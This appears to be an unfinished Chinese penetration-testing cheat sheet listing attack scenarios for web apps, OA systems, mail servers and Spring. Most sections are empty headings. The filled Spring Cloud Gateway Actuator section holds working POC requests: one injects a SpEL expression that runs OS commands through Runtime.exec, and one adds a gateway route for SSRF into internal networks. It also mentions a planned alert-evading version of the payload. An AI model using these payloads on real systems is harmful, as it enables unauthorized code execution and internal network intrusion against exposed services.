
# **一、通用场景**

## **0x01 Web主页**

### 1.Web登录口

#### 1.1 注册口

#### 1.2 忘记密码

### 2.资源文件

#### 2.1 JS文件

#### 2.2 html文件

## **0x02 Web展示页面**

### 3.文章展示

#### 3.1 文章查询接口

#### 3.2 文章评论接口

#### 3.3 文章资源请求接口

---

# **二、应用场景**

## **0x01 Spring**

### 1.Spring Actuator
```
Spring Actuator在各类接口未授权的情况下，存在大量的利用手法，如表达式注入，代码执行，SSRF等。这些漏洞大部分可能都是Spring Actuator接口本身存在的功能，但是在未授权的情况
```
> **1.1 Spring Gateway Routes**  
/actuator/gateway本身具备路由添加的功能，接口如下：  
>
>| ID | HTTP_METHOD | Description |
>| ---- | ---- | ---- |
>| `globalfilters` | GET | 展示所有全局filter支持的路由 |
>| `routefilters` | GET | 展示`GatewayFilter`支持的路由 |
> | `refresh` | POST | 清除路由缓存 |
> | `routes` | GET | 展示gateway所有定义的路由 |
> | `routes/{id}` | GET | 展示{id}路由的有关信息 |
> | `routes/{id}` | POST | 添加新的路由 |
> | `routes/{id}` | DELETE | 删除已经存在的路由 |
>
>Spring gateway routes存在两种利用方式，`代码执行`以及`SSRF`  
常见的识别方式如下：  
`URI: /actuator/gateway/routes`  
`HTTP_METHOD：GET`  
`MATCH: response.status_code == 200 and 'route_id' in response.content`  
>> **a) 代码执行**  
***（占个坑后续搞一个无告警版本的POC）***  
实际上是SpEL表达式解析，问题在于`globalfilters	`中的`AddResponseHeaderGatewayFilterFactory`，`normalize`对`filter`属性解析过程中调用的`ShortcutConfigurable`中的`getValue`，进而导致了SpEL表达式解析  
`POC`
```
POST /actuator/gateway/routes/new_route
Host: 127.0.0.1:8080
Connection: close
Content-Type: application/json  
-
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```
>**b) SSRF**  
SSRF漏洞则是利用gateway的正常功能进行配置，在对内部环境有一定了解的情况下，可以利用路由部署的功能将路由设置为内网中的某一应用，进而进行互联网访问。值得一提的是，利用这种方式进行内网应用存在资源加载不完整，路由跳转等问题，通过不断添加路由，并使用代理工具的方式将整个路由给串起来.  
代理工具：<https://github.com/abhinavsingh/proxy.py>  
`POC`
```
POST /actuator/gateway/routes/new_route HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Content-Type: application/json
-
{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/new_route/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "/new_route(?<path>.*)",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "https://www.baidu.com",
  "order": 0
}
```

### 2) Spring Security

### 3)

## **0x02 OA应用**
### 1.蓝凌OA
> **1) 文件读取漏洞**  
> **2) 前台代码执行**  
场景可以是RCE，也可以是信息获取  
```
// RCE场景
// 敏感信息获取场景
```
> **3)认证绕过漏洞-1**  
产生原因是配置不当导致的任意后缀绕过
```
```
> **4) 认证绕过漏洞-2**  
产生原因是shiro框架导致的绕过
```
```
### 2.致远OA
### 3.泛微OA

## **0x03 邮箱应用**
### 1.coremail
### 2.exchange

## **0x04 Wiki应用**
### 1.Confluence
```
目前知道的几个RCE都是由于SpEL表达式解析导致的
```

## **0x05 软件开发平台应用**
### 1.Jenkins
```
代码执行，未授权导致的代码执行
```

## **0x06 数据库应用**

## **0x07 配置应用**

## **0x08 终端集管**

## **0x09 服务器集管**

## **0x10 域环境**

## **0x11 网管应用**
---

# **三、云场景**

## **5.K8s应用**
